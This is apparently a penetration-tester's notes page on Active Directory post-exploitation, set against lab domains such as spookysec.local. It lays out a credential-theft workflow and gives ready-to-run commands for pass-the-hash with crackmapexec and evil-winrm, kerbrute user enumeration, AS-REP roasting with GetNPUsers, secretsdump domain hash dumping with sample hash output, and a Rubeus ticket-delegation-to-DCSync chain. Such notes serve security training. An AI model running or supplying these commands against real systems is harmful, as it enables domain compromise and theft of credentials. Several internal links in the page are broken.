# Post-Exploitation

You should approach to first machine in AD as regular standalone windows machine. Lateral movement or privilege escalation as well.

You can do post exploitation steps as follows:

Check groups where the user is in. Check the user in some privileged group.

Check another users in the domain.

Search files in the system for finding passwords, important notes and information, mail etc.

Check services on the system.

Some services contains cleartext passwords, hashes in some files.

Extract hashes, secrets, kerberos tickets with mimikatz etc. (requires system shell)

{% content-ref url="../password-hash-attacks/password-extraction.md" %}
[password-extraction.md](../password-hash-attacks/password-extraction.md)
{% endcontent-ref %}

Try pass the hash methods like using psexec or crackmapexec from impacket, evil-winrm, xfreerdp etc. (If the target user has not Administrator rights, you cannot get shell with impacket).

Try cracking extracted hashes.

{% content-ref url="../password-hash-attacks/password-cracking/" %}
[password-cracking](../password-hash-attacks/password-cracking/)
{% endcontent-ref %}

Check SPNs. If there is SPN in system, try extract and crack it.

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

Check GMSA. If there is gmsa account in the system, try extract and crack it.

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

If you have cleartext password you can use Spray-Passwords.ps1 to identify the another user is using the same password.

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

Check the user has capabilities for exploitable GPO.

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

You can try recent AD exploits to get domain admin privileges.

## Crackmapexec

```
# pass the hash
crackmapexec smb --local-auth 10.11.1.0/24 -H ee0c207898a5bccc01f38115019ca2fb -u Administrator
```

## Kerbrute

> This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication. It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.

```
# enum valid usernames
./kerbrute userenum userlist.txt -d spookysec.local --dc 10.10.70.25
```

![](<../../.gitbook/assets/image (32) (2) (1).png>)

## **ASREPRoasting**

> After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.** ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
>
> Impacket has a tool called "GetNPUsers.py" that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames

### Impacket-GetNPUsers

```
impacket-GetNPUsers spookysec.local/ -usersfile usernames.txt -format john
impacket-GetNPUsers spookysec.local/ -usersfile usernames.txt -format hashcat
```

![](<../../.gitbook/assets/image (40) (2).png>)

Crack the hash with whatever format you chose

```
svc-admin : management2005
```

## Impacket-secretsdump

> We can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that a user account (that is synced with the domain controller) has to offer

```
impacket-secretsdump backup@spookysec.local

Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
.
.
.
.
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
```

This command dumps SAM hashes using the the Administrator's hash as a PTH method rather than entering a password

```
impacket-secretsdump Administrator@10.11.1.123 -hashes '3fee04b01f59a1001a366a7681e95699:3fee04b01f59a1001a366a7681e95699'
```

## Pass-The-Hash

### Evil-WinRM

> method of attack could allow us to authenticate as the user without the password

```
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

## Rubeus

{% code overflow="wrap" %}
```bash
# gets tgt of machine account
.\Rubeus.exe tgtdeleg /nowrap
# decode it to .kirbi file
cat b64hash | base64 -d > m.kirbi
# convert ticket to ccache file
impacket-ticketconverter m.kirbi m.ccache
export KRB5CCNAME=`pwd`/m.ccache
klist
# syncronize time just in case
sudo ntpdate -u IP
# dump hashes
impacket-secretsdump domain.local/DC-NAME\$@dc-name.domain.local -dc-ip domain.local -no-pass -k
```
{% endcode %}
